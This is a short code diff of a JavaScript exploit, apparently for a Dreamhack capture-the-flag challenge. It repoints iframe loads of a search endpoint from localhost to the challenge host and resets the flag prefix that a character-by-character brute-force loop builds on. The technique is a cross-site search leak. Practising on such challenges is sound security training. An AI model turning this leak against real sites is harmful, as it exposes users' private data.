@@ -5,7 +5,7 @@
         return new Promise((resolve) => {
             const iframe = document.createElement("iframe");
             // 내부망의 IP를 사용
-            iframe.src = "http://127.0.0.1:8000/search?query=" + query;
+            iframe.src = "http://host1.dreamhack.games:12708/search?query=" + query;
             document.body.appendChild(iframe);
             let removed = false;
 
@@ -37,7 +37,7 @@
 
     async function exploit() {
         let chars = "0123456789abcdef}";
-        let secret = "DH{22d144";
+        let secret = "DH{";
 
         while (!secret.includes("}")) {
             let promises = chars.split("").map(c => 
